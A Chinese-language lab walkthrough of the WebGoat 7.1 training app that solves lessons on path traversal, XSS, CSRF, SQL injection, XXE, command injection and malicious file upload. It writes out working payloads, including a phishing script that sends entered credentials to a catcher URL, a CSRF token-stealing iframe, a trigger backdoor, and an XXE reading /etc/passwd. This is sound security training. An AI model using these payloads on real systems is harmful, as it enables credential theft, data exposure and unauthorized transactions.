安装  

`docker pull webgoat/webgoat-7.1`  
`docker run -p 8080:8080 -t webgoat/webgoat-7.1`

`网站：``[http://IP:8080/WebGoat/login.mvc](http://ip:8080/WebGoat/login.mvc)`

如果想要进去docker容器，docker ps查看容器，然后docker exec –it 容器ID /bin/bash

# General

## Http Basics（HTTP基础）

该选项是显示HTTP数据包的内容，使用burpsuit代理抓取数据包，我在EnterYourName输入1，下面数据包person参数接收1。

    
    
    POST/WebGoat/attack?Screen=1869022003&menu=100 HTTP/1.1
    
    Host: 223.168.1.128:8000
    
    User-Agent: Mozilla/5.0 (Windows NT 6.1;WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
    
    Accept: */*
    
    Accept-Language:zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
    
    X-Requested-With: XMLHttpRequest
    
    Referer:http://223.168.1.128:8000/WebGoat/start.mvc
    
    Content-Length: 19
    
    Cookie:JSESSIONID=9CC338A02AEA2ADCB44302FDB691BB09
    
    Connection: close
    
     
    
    person=1&SUBMIT=Go!  
    

  

  

# Access Control Flaws（访问控制缺陷）

## Using an Access Control Matrix（使用访问控制矩阵）

在基于角色的访问控制方案中，角色表示一组访问权限和权限。用户可以被分配一个或多个角色。基于角色的访问控制方案通常由角色权限管理和角色分配两部分组成。基于角色的访问控制方案可能允许用户执行他/她分配的角色不允许的访问，或以某种方式允许向未授权角色提升权限。

 ****

**一般目标：**

每个用户都是允许访问某些资源的角色的成员。您的目标是 **探索管理此网站的访问控制规则。** 只有[Admin]组才能访问“Account
Manager”资源。

示范如下：

MOE用户不允许访问该组

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068452908704.png)  

Larry允许访问该组，左上角打钩代表课程完成。

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/1506845306263.png)  

## Bypass a Path Based Access Control Scheme（绕过路径访问控制方案）

'webgoat'用户可以访问lessonPlans/en目录中的所有文件。 尝试破坏访问控制机制并访问不在列出的目录中的资源。
选择要查看的文件后，WebGoat将报告是否授予对文件的访问权限。 尝试获取的有趣文件可能是像WEB-INF/spring-security.xml这样的文件。 请记住，文件路径将根据WebGoat的启动方式而有所不同。

当前路径：

/.extract/webapps/WebGoat/plugin_extracted/plugin/BlindStringSqlInjection/lessonPlans/en/BlindStringSqlInjection.html

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068453277245.png)  

现在我们要获取WEB-INF/spring-security.xml文件的内容。首先说一下../代表上一级目录，其次我们要找到文件的路径，最后更改文件路径。

操作如下，使用burpsuit修改File参数的内容：

    
    
    POST/WebGoat/attack?Screen=231255157&menu=200 HTTP/1.1
    
    Host: 223.168.1.128:8000
    
    User-Agent: Mozilla/5.0 (Windows NT 6.1;WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
    
    Accept: */*
    
    Accept-Language:zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type:application/x-www-form-urlencoded; charset=UTF-8
    
    X-Requested-With: XMLHttpRequest
    
    Referer:http://223.168.1.128:8000/WebGoat/start.mvc
    
    Content-Length: 64
    
    Cookie:JSESSIONID=9CC338A02AEA2ADCB44302FDB691BB09
    
    Connection: close
    
     
    
    File=../../../../../WEB-INF/spring-security.xml&SUBMIT=View+File

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068453872627.png)  
  

## LAB: Role Based Access Control（基于角色的访问控制）

该类型分四个阶段，故而在下面阶段演示。

## Stage 1: Bypass Business Layer Access Control（阶段1：绕过业务层访问控制）

作为普通员工“tom”，利用弱访问控制来使用“职员列表”页面中的“删除”功能。验证可以删除汤姆的个人资料。用户的密码是小写的给定名称（例如Tom
Cat的密码是“tom”）。

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/1506845402782.png)  

登录进去之后，对ViewProfile按钮进行抓包

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068454095086.png)  

修改action参数的内容为DeleteProfile，然后发送数据包即可。

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/1506845415711.png)  

## Stage 2: Add Business Layer Access Control.

 **本课程仅与WEBGOAT** **的开发者版本协调工作**

执行修复以拒绝未经授权的访问删除功能。为此，您必须更改WebGoat代码。完成此操作后，重复第1步，并验证是否正确地拒绝对DeleteProfile功能的访问。

进入docker容器

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506845437898.png)  

查看代码

  

因为本人不熟悉Java代码，所以这一部分跳过。

## Stage 3: Breaking Data LayerAccess Control（阶段3：打破数据层访问控制）

 **目标** ：作为普通员工“tom”，利用弱访问控制来查看其他员工的个人资料。

使用tom用户登录

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068454774156.png)  

对viewprofile按钮进行抓包，105是tom的ID号，而Larry的ID号为101，修改ID为101

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068454885474.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068454999735.png)  

## Stage 4: Add Data Layer Access Control.（阶段4：添加数据层访问控制。）略

# AJAX Security

## DOM Injection

*您的受害者是一个系统，需要一个激活密钥才能使用它。

*您的目标应该是尝试启用激活按钮。

*请花一些时间查看HTML源码，以了解关键验证过程的工作原理。

使用调试器，找到activate按钮的源代码，将disable=“”这一段删除，然后按钮启用，点击按钮即可。

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068455557287.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068455627264.png)  

## LAB: DOM-Based cross-site scripting

阶段1：对于本练习，您的任务是使用以下位置的图像对本网站进行描述：OWASP IMAGE

在输入框输入<img src="images/logos/owasp.jpg" />，点击按钮

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068455683386.png)  

STAGE 2：现在，尝试使用image标签创建JavaScript警报

在输入框输入<img src=test onerror="alert('this is xss test')">，点击按钮即可

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068455868155.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068455928849.png)  

阶段3：接下来，尝试使用IFRAME标签创建JavaScript警报。

在输入框输入<iframe src=javascript:alert(0)></iframe>，点击按钮即可

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068456016058.png)  

阶段4：使用以下命令创建假登录表单：

    
    
    Hello, Please enter your password :<BR><inputtype = "password" name="pass"/><buttononClick="javascript:alert('I have your password:'+pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068456085305.png)  

阶段5：执行客户端HTML实体编码以减轻DOM XSS漏洞。在escape.js中为您提供了一种实用方法。

进入docker容器

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068456186877.png)  

修改DOMXSS.js，在name加上escapeHTML（），即escapeHTML(name),然后保存即可。

## LAB: Client Side Filtering（LAB：客户端过滤）

阶段1：您以山羊山金融公司（CSO）Moe
Stooge的身份登录。您可以访问公司信息中的每个人，除了CEO，内维尔巴塞洛缪。或者至少你不应该访问CEO的信息。对于此练习，请检查页面的内容，以查看可以找到的额外信息。

使用调试器，找到Bartholomew，输入450000

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068456278630.png)  

阶段2：现在，解决问题。修改服务器只返回可以看到Mustache的结果。

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068456375135.png)

刷新网页，点击Click here when you believe you have completed the lesson.按钮

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068456577346.png)  

## XML Injection

WebGoat-Miles奖励里程显示所有可用的奖励。 输入帐户号码后，课程将显示您的余额和您负担得起的产品。
您的目标是尝试为您所允许的一套奖励增加更多奖励。 您的帐户ID是836239。

在输入框输入836239

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068456663646.png)  

使用调试器找到勾选框所在的源代码，添加两个<tr>,然后将所有框都打上勾

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068456712083.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068456821750.png)  

## JSON Injection

*您从波士顿，MA-机场代码BOS到西雅图，WA - 机场代码SEA。

*输入机场的三位数代码后，将会执行一个AJAX请求，询问机票价格。

*你会注意到有两个航班可用，一个昂贵的一个没有停止，另一个便宜的一个有2站。

*你的目标是试图要一个没有停止，但更便宜的价格。

正常是这样

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068456944093.png)  

使用burpsuit抓取，并显示响应包

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457003247.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457067563.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/1506845712696.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457203502.png)  

还有另外一种思路，直接改最后的数据包

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457276502.png)  

## Silent Transactions Attacks（静默交易攻击）

*这是一个示例的网上银行应用程序 - 汇款页面。

*显示在您的余额之下，您转移的账户和您将转账的金额。

*应用程序使用AJAX在进行一些基本的客户端验证后提交交易。

*您的目标是尝试绕过用户的授权，并以静默方式执行交易。

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457375295.png)  

在调试器输入javascript:submitData(12345,11111111111)

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457458716.png)  

## Insecure Client Storage（不安全的客户端存储）

阶段1：对于此练习，您的任务是发现优惠券代码以获得意想不到的折扣。

使用firebug对js进行调试，发现优惠价代码：PRESSTWO

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457531021.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457584308.png)  

阶段2：现在，尝试免费获得整个订单。

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457635559.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457683266.png)  

## Dangerous Use of Eval

对于这个练习，你的任务是提出一些包含脚本的输入。您必须尝试将此页面反映回您的浏览器，这将执行脚本。为了通过本课程，您必须'alert（）'document.cookie。

在输入框输入123')%3Balert(document.cookie)%3B('

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/1506845778103.png)  

## Same Origin Policy Protection

本演示演示了同源政策保护。 XHR请求只能被传回给始发服务器。尝试将数据传递到非始发服务器将失败。

输入网址：/WebGoat/plugin_extracted/plugin/SameOriginPolicyProtection/jsp/sameOrigin.jsp

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068457884537.png)  

输入网址：<http://www.google.com/search?q=aspect+security>

This exercise demonstrates the Same OriginPolicy Protection. XHR requests can
onlybe passed back to the originatingserver. Attempts to pass data to anon-originating server will fail.（本演示演示了同源政策保护。
XHR请求只能被传回给始发服务器。尝试将数据传递到非始发服务器将失败。）

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068458082320.png)  

# Authentication Flaws（认证漏洞）

## Password Strength（密码强度）

您的Web应用程序的帐户与密码一样安全。对于此练习，您的工作是在<https://howsecureismypassword.net>上测试多个密码。
您必须同时测试所有6个密码...

在你的应用程序你应该设置好的密码要求！

桌面电脑需要多少时间来破解这些密码？

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068458338872.png)  

## Forgot Password（忘记密码）

Web应用程序经常为用户提供检索忘记密码的能力。 不幸的是，许多Web应用程序无法正确实现机制。 验证用户身份所需的信息往往过于简单。

一般目标：

如果用户可以正确回答这个秘密问题，用户可以检索密码。这个“忘记密码”页面上没有锁定机制。您的用户名是“webgoat”，您最喜欢的颜色是“红色”。目标是检索另一个用户的密码。

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068458435943.png)  

我检索admin用户

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/1506845850611.png)  

## Multi Level Login 1

阶段1：这个阶段只是为了展示一个经典的多登录是如何工作的。您的目标是通过用户Jane和密码tarzan进行常规登录。您有以下TAN：

Tan＃1 = 15648

Tan＃2 = 92156

Tan＃3 = 4879

Tan＃4 = 9458

Tan＃5 = 4879

 **登录**

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068458597504.png)

# Buffer Overflows

## Off-by-One Overflows（逐个溢出）

第一步操作，东西随便填。

第二步操作，使用burpsuit拦截

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068458702522.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068458742821.png)  

将拦截到数据包发送到intruder

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068458824624.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068458876217.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506845892742.png)  

# Code Quality（代码质量）

## Discover Clues in the HTML（在HTML中发现线索）

开发人员在源代码中留下诸如FIXME，TODO，Code Broken，Hack等的信息。 以下是基于表单的身份验证形式的示例。 寻找帮助您登录的线索。  

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506845901909.png)  

# Concurrency（并发）

## Thread Safety Problems（线程安全问题）

用户应该能够利用此Web应用程序中的并发错误，并查看正在尝试同一功能的另一个用户的登录信息。这将需要使用两个浏览器。有效的用户名为'jeff'和'dave'。  
请输入您的用户名以访问您的帐户。  

**手速要快！！！打开两个浏览器输入jeff**

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068459189439.png)  

## Shopping Cart Concurrency Flaw（购物车并发缺陷）

对于此练习，您的任务是利用并发问题，这样可以以更低的价格购买商品。

A浏览器选择购买

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068459254374.png)

  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068459354201.png)  

B浏览器选择更新

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068459415484.png)  

然后在A浏览器看到可以用较低的钱买价格高的东西

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068459648644.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068459708466.png)  

# Cross-Site Scripting (XSS)

## Phishing with XSS（网络钓鱼XSS）

本课程是网页如果在网页上发生已知XSS攻击时可能支持网络钓鱼攻击的示例  

以下是标准搜索功能的示例。

使用XSS和HTML插入，您的目标是：

将html插入该请求凭据

添加javascript以实际收集凭据

将凭据发送到<http://localhost:8080/WebGoat/catcher?PROPERTY=yes...>

要通过本课程，凭证必须发布到捕获者servlet。

在输入框输入一下代码

    
    
    <script>functionhack(){ alert("Had this been a real attack... Your credentials were juststolen. User Name = " + document.forms[1].user.value + "Password =" + document.forms[1].pass.value); XSSImage=new Image(); XSSImage.src="http://192.168.8.89:8080/WebGoat/catcher?PROPERTY=yes&user="+document.forms[1].user.value+ "&password=" + document.forms[1].pass.value + "";}</script><form><br><br><HR><H3>This featurerequires account login:</H3 ><br><br>EnterUsername:<br><input type="text" id="user"name="user"><br>Enter Password:<br><inputtype="password" name = "pass"><br><inputtype="button" name="login" value="login"onclick="hack()"></form><br><br><HR>

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068459818393.png)  

## LAB: Cross Site Scripting

## Stage 1: Stored XSS

第一步，先使用tom账号登录（密码：tom）

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068459897425.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068459945155.png)  

第二步，使用HR(密码：jerry）号登录，查看tom的信息

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068460008588.png)  

## Stage 2: Block Stored XSS using Input Validation（修复过程略）

## Stage 3: Stored XSS Revisited

验证Bruce的个人简介中包含有XSS攻击，使用David用户（密码：david）登录，查看Bruce的个人简介，出现弹窗，表明存在XSS攻击。

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068460322436.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068460383203.png)

## Stage 4: Block Stored XSS using Output Encoding（修复过程略）

Stage 5: Reflected XSS

使用用户Larry（密码：larry）登录，在Search Staff搜索框中输入。

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068460584447.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068460634942.png)  

## Stage 6: Block Reflected XSS（修复过程略）

## Stored XSS Attacks（存储型XSS）

在表单输入<script>alert(0)</script>  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068460808576.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068460887015.png)  

## Reflected XSS Attacks（反射型XSS）

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068460999800.png)  

<img src="attack?Screen=2078372&menu=900&transferFunds=5000" />  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068461046916.png)  

## Cross Site Request Forgery (CSRF)

您的目标是向新闻组发送电子邮件。 该电子邮件包含一个图像，其URL指向恶意请求。
在本课中，URL应该指向“攻击”servlet，其中包含课程的“屏幕”和“菜单”参数，以及具有任意数值的额外参数“transferFunds”（如5000）。您可以通过查找“屏幕”来构建链接
“和”菜单“值在右侧的参数插入。 当时通过身份认证的CSRF电子邮件的接收者将转移资金。
当本课程的攻击成功时，左侧菜单中的课程名称旁边会显示一个绿色的勾号。  

    
    
    <img src="attack?Screen=2078372&menu=900&transferFunds=5000"/>

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068461115368.png)![Clipboard
Image.png](https://image.3001.net/images/20171001/15068461165663.png)

  

## CSRF Prompt By-Pass

类似于CSRF课程，您的目标是向包含多个恶意请求的新闻组发送电子邮件：第一个转移资金，第二个请求确认第一个请求触发的提示。 URL应该使用此CSRF-prompt-by-pass课程的屏幕，菜单参数和具有数字值（例如“5000”）的额外参数“transferFunds”来指向攻击小服务程序，以启动传输和字符串值“CONFIRM”
完成它。 您可以从右侧的插图复制课程参数，创建格式为“attack？Screen = XXX＆menu = YYY＆transferFunds =
ZZZ”的网址。 谁收到这封电子邮件，恰好在当时被认证，将有资金转移。 当您认为攻击成功时，刷新页面，您将在左侧菜单中找到绿色检查。  

  

    
    
    <img src="http://192.168.8.89:8080/WebGoat/attack?Screen=227&menu=900&transferFunds=5000" onerror="document.getElementById('image2').src='http://192.168.8.89:8080/WebGoat/attack?Screen=227&menu=900&transferFunds=CONFIRM'"> <imgid="image2">  
    

  

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846122638.png)  

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068461271225.png)  

## CSRF Token By-Pass

类似于CSRF课程，您的目标是向包含恶意请求转移资金的新闻组发送电子邮件。 要成功完成，您需要获取有效的请求令牌。
提供转账资金表单的页面包含一个有效的请求令牌。 转移资金页面的URL是本课程的“屏幕”和“菜单”查询参数以及额外的参数“transferFunds =
main”的“攻击”servlet。 加载此页面，读取令牌，并在伪造的请求中附加令牌以传输数据。
当您认为攻击成功时，刷新页面，您将在左侧菜单中找到绿色检查。  

  

    
    
    <script>
    
    var readToken = function(){
    
    var doc = document.getElementById("frame1").contentDocument
    
    var token = doc.getElementsByName("CSRFToken")[0].getAttribute("value");
    
    alert(token);
    
    var frame2 = document.getElementById("frame2");
    
    frame2.src = "http://192.168.8.89:8080/WebGoat/attack?Screen=2&menu=900&transferFunds=4000&CSRFToken="+token;
    
    }
    
    </script>
    
    <iframe id="frame2" >
    
    </iframe>
    
    <iframe id="frame1" onload="readToken()" src="http://192.168.8.89:8080/WebGoat/attack?Screen=2&menu=900&transferFunds=main" >
    
    </iframe>  
    

  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068461354380.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068490309301.png)  

## HTTPOnly Test

为了帮助减轻跨站点脚本威胁，Microsoft已经推出了一个名为“HttpOnly”的新Cookie。
如果设置了此标志，则浏览器不允许客户端脚本访问该cookie。 由于属性相对较新，因此若干浏览器忽略了正确处理新属性。

有关受支持浏览器的列表，请参阅：OWASP HTTPOnly支持

一般目标：

本课的目的是测试您的浏览器是否支持HTTPOnly cookie标志。 注意unique2u cookie的值。
如果您的浏览器支持HTTPOnly，并且您启用Cookie，则客户端代码无法读取或写入该cookie，但浏览器仍可将其值发送到服务器。
某些浏览器只能防止客户端读取访问，但不要阻止写入访问。

打开HTTPOnly属性后，在浏览器地址栏中输入“javascript：alert（document.cookie）”。 注意除了unique2u
cookie之外，所有Cookie都会显示。

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068461538296.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068461562392.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846159529.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068461634137.png)

  

# Improper Error Handling（不当的错误处理）

## Fail Open Authentication Scheme（失败的认证方案）

由于认证机制中的错误处理问题，可以在不输入密码的情况下认证为“webgo”用户。 尝试以webgoet用户身份登录，而不指定密码。  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068461723193.png)  

删除password参数

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462237001.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068461886290.png)  

# Injection Flaws

## Command Injection（命令注入）

命令注入攻击是对任何参数驱动的站点的严重威胁。攻击背后的方法易于学习，造成的损害可能会从相当大的到完全的系统妥协。尽管有这些风险，互联网上的令人难以置信的系统容易受到这种形式的攻击。

不仅容易引起威胁，而且也是一个威胁，有一点常识和预想，几乎完全可以防止。本课将向学生展示参数注入的几个例子。

清理所有输入数据，特别是将在OS命令，脚本和数据库查询中使用的数据是一贯的良好做法。

尝试向操作系统注入一个命令。

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462331000.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462377520.png)

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462418772.png)  

## Numeric SQL Injection（数字型注入）

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846248648.png)  

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462531499.png)  

## Log Spoofing（日志欺骗）

*以下灰色区域表示Web服务器的日志文件中将要记录的内容。

*您的目标是让用户名“admin”成功登录。

*通过向日志文件添加脚本来提升攻击。

在输入框输入：Smith%0d%0aLogin Succeeded for username: admin

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462595449.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462647171.png)  

  

## XPATH Injection

下面的表格允许员工查看他们所有的个人资料，包括他们的工资。 您的帐户是Mike / test123。 您的目标是尝试查看其他员工的数据。  

在用户输入框输入Smith' or 1=1 or 'a'='a，密码框随便输入

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462734206.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462774809.png)

  

String SQL Injection（字符串注入）  

SQL注入攻击是对任何数据库驱动的站点的严重威胁。攻击背后的方法易于学习，造成的损害可能会从相当大的到完全的系统妥协。尽管有这些风险，互联网上的令人难以置信的系统容易受到这种形式的攻击。

不仅容易引起威胁，还可以轻而易举地预防这种威胁。

即使以其他方式阻止了SQL注入的威胁，所有的操作都是清理所有输入数据，尤其是在OS命令，脚本和数据库查询中使用的数据。

一般目标：

下面的表格允许用户查看他们的信用卡号码。尝试注入一个SQL字符串，导致显示所有信用卡号。尝试用户名“史密斯”。

现在您已成功执行SQL注入，请尝试对参数化查询进行相同类型的攻击。如果您希望返回到可注入的查询，请重新启动课程。

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462836609.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846289165.png)

  

## LAB: SQL Injection

## Stage 1: String SQL Injection

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068462961559.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068463002839.png)

## Stage 2: Parameterized Query #1（修复方式：参数化查询）

## Stage 3: Numeric SQL Injection

使用larry用户登录

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068463281371.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068463331491.png)  

刷新浏览器

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068463384859.png)  

## Stage 4: Parameterized Query #2（修复方式：参数化查询）

## Database Backdoors（数据库后面）

 **101;update employee set salary=1234567 where userid=101**

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068463651826.png)  

**101;create trigger mybackdoor**

 **before insert on employee foreach row begin update**

 **employee setemail='john@hackme.com' where userid=new.userid**

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068463741109.png)

  

## Blind Numeric SQL Injection（数字型盲注）

 **101 AND ((SELECT pin FROM pins WHEREcc_number='1111222233334444') > 1000
);**

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068463821901.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846391269.png)  

一直用二分法找到数字是2364

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068463961332.png)  

## Blind String SQL Injection（字符串盲注）

101 AND (SUBSTRING((SELECT name FROM pinsWHERE cc_number='4321432143214321'),
1, 1) < 'H' );

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464089504.png)  

第二个字符：改成2，以此类推。

101 AND (SUBSTRING((SELECT name FROM pinsWHERE cc_number='4321432143214321'),
2, 1) < 'H' );

答案找到是Jill

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464145706.png)  

# Denial of Service（拒绝服务攻击）

## ZipBomb（压缩包炸弹）

服务器只接受ZIP文件，在上传后提取它们，并与其一起删除，并提供20 MB的临时存储来处理所有请求，尝试执行DOS攻击，消耗所有临时存储与一个请求

简单来说，一直上传低于20M的压缩包，把服务器弄崩溃

## Denial of Service from Multiple Logins

先获取所有帐号

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464243500.png)  

打开三个页面

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464329344.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464369416.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464406678.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464462705.png)

  

# Insecure Communication（不安全的通讯）

## Insecure Login（不安全登录）

使用调试器看到密码

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464563604.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464602686.png)

第二阶段改成https

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846464727.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464722663.png)

  

# Insecure Storage（不安全存储）

## Encoding Basics（加密基础）

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068464878750.png)  

# Malicious Execution（恶意执行）

## Malicious File Execution（恶意文件执行）

    
    
    <HTML>
    
    <% java.io.File file= newjava.io.File("/.extract/webapps/WebGoat/mfe_target/webgoat.txt");file.createNewFile();%>
    
    </HTML>  
    

  

保存成jsp上传

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846494645.png)  

<http://192.168.8.89:8080/WebGoat/uploads/1.jsp>，再刷新一下浏览器即可

# Parameter Tampering（参数修改）

## Bypass HTML Field Restrictions

将表单启用，再使用burpsuit抓包，随便修改6个参数内容

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465055024.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846511363.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465142091.png)  

## XML External Entity (XXE)

    
    
    <?xml version="1.0"?>
    
     <!DOCTYPE Header [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    
    <searchForm> <from>&ampxxe</from></searchForm>  
    

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465268607.png)

  

## Exploit Hidden Fields（利用隐藏的字段）

简单来说，就是改了前端的值

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465318492.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465383816.png)  

## Exploit Unchecked Email

此表格是客户支持页面的示例。 使用下面的表单尝试：

1）向网站admin发送恶意脚本。

2）从OWASP向“朋友”发送恶意脚本。

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465454619.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465493162.png)  

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465547865.png)  

## Bypass Client Side JavaScript Validation

该网站执行客户端和服务器端验证。 对于此练习，您的工作是打破客户端验证并发送不期望的网站输入。 您必须同时打破所有7个验证器。  

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465688850.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465723353.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465763339.png)

  

# Session Management Flaws

## Hijack a Session（点击劫持）

参考视频：<https://www.youtube.com/watch?v=FA5FjjV4L7Y>

Cookie里面的WEAKID这个参数是会话标识。我们知道如果客户端发送给Web
服务器的请求里面没有会话标识的话，服务器会从新生成一个新的会话标识并通过Cookie返回给客户端

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465869878.png)

发送数据包到sequencer选项

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465895692.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465937592.png)

由于burpsuite的fuzz不到cookie的位置，故显示不了效果，具体的可以参照视频。

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068465966936.png)

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466005745.png)

  

Spoof an Authentication Cookie（欺骗认证Cookie）

Webgoat:AuthCookie=65432ubphcfx

Aspect:AuthCookie=65432udfqtb

alice用户的cookie是65432，ecilaèfdjmb

分析cookie，64532是不变的，后面的字符串是经历逆转字符串，然后往后推一位

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466116884.png)  

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846617370.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846621138.png)  

![Clipboard
